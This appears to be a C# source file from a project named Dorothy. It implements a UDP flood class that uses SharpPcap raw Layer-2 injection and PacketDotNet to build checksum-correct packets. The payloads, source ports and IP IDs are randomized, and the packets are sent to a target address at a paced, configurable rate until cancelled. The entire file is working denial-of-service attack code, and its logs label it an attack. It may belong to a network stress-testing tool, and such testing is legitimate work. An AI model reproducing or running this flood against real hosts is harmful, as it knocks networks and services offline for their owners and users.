using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Linq;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace Dorothy.Models
{
    /// <summary>
    /// UDP flood using SharpPcap Layer-2 injection with PacketDotNet packet construction.
    /// PacketDotNet computes correct big-endian headers and UDP checksum automatically,
    /// eliminating the malformed-packet issue that raw sockets caused on Windows.
    /// </summary>
    public class UdpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;

        public event EventHandler<PacketEventArgs>? PacketSent;

        public UdpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting UDP Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr =>
                        addr.Addr.ipAddress != null &&
                        addr.Addr.ipAddress.ToString() == _params.SourceIp.ToString()));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                var sourceMac = PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", ""));
                var destMac = PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", ""));

                var random = new Random();
                const int payloadSize = 1400;
                const int poolSize = 500;

                // Build template packet chain — PacketDotNet handles network byte order and checksums
                var ethernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
                var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                {
                    Protocol = PacketDotNet.ProtocolType.Udp,
                    TimeToLive = _params.Ttl
                };
                var udpPacket = new UdpPacket(
                    (ushort)_params.SourcePort,
                    (ushort)_params.DestinationPort)
                {
                    PayloadData = new byte[payloadSize]
                };

                ipPacket.PayloadPacket = udpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                // Pre-generate pool with randomized payloads, source ports, and IP IDs
                var packetPool = new byte[poolSize][];
                for (int i = 0; i < poolSize; i++)
                {
                    random.NextBytes(udpPacket.PayloadData);
                    udpPacket.SourcePort = (ushort)random.Next(1024, 65535);
                    ipPacket.Id = (ushort)random.Next(0, 65536);
                    // UpdateCalculatedValues computes UDP checksum (pseudo-header) and IP checksum
                    udpPacket.UpdateCalculatedValues();
                    ipPacket.UpdateCalculatedValues();
                    packetPool[i] = ethernetPacket.Bytes;
                }

                // Wire size includes 4-byte FCS added by NIC
                int wirePacketSize = packetPool[0].Length + 4;
                double targetMbps = _params.BytesPerSecond * 8.0 / 1_000_000;
                Logger.Info($"UDP packet: {packetPool[0].Length} bytes ({wirePacketSize} bytes on wire), target={targetMbps:F2} Mbps");

                await Task.Run(() =>
                {
                    var stopwatch = Stopwatch.StartNew();
                    long bytesSent = 0;
                    long targetBytesPerSecond = _params.BytesPerSecond;

                    var measurementStartTime = stopwatch.ElapsedTicks;
                    long measurementStartBytes = 0;
                    const int measurementWindowMs = 500;
                    double smoothedActualMbps = 0;
                    const double smoothingAlpha = 0.3;

                    bool isLowRate = targetMbps < 5.0;
                    int sleepCounter = 0;
                    int poolIdx = 0;

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            double elapsedSeconds = stopwatch.ElapsedTicks / (double)Stopwatch.Frequency;
                            long allowedBytes = (long)(elapsedSeconds * targetBytesPerSecond);

                            if (bytesSent < allowedBytes)
                            {
                                long bytesBehind = allowedBytes - bytesSent;
                                int maxBurst = targetMbps > 50 ? 50 : (targetMbps > 10 ? 20 : 10);
                                int packetsToSend = Math.Min((int)(bytesBehind / wirePacketSize) + 1, maxBurst);

                                for (int i = 0; i < packetsToSend && bytesSent < allowedBytes; i++)
                                {
                                    _device.SendPacket(packetPool[poolIdx]);
                                    OnPacketSent(packetPool[poolIdx], _params.SourceIp, _params.DestinationIp, _params.DestinationPort);
                                    bytesSent += wirePacketSize;
                                    poolIdx = (poolIdx + 1) % poolSize;
                                }
                            }
                            else
                            {
                                if (isLowRate && sleepCounter++ % 10 == 0)
                                    Thread.Sleep(0);
                                else
                                    Thread.SpinWait(10);
                            }

                            long currentTicks = stopwatch.ElapsedTicks;
                            double elapsedSinceMeasurement = (currentTicks - measurementStartTime) / (double)Stopwatch.Frequency;

                            if (elapsedSinceMeasurement >= measurementWindowMs / 1000.0)
                            {
                                long bytesInWindow = bytesSent - measurementStartBytes;
                                double actualMbps = (bytesInWindow * 8.0) / (elapsedSinceMeasurement * 1_000_000);

                                smoothedActualMbps = smoothedActualMbps == 0
                                    ? actualMbps
                                    : (smoothingAlpha * actualMbps) + ((1.0 - smoothingAlpha) * smoothedActualMbps);

                                Logger.Info($"UDP rate: actual={smoothedActualMbps:F2} Mbps, target={targetMbps:F2} Mbps, bytesSent={bytesSent}, allowed={allowedBytes}");

                                measurementStartTime = currentTicks;
                                measurementStartBytes = bytesSent;
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending UDP packet.");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "UDP Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
            }
        }

        public void Dispose()
        {
            _device?.Close();
        }
    }
}
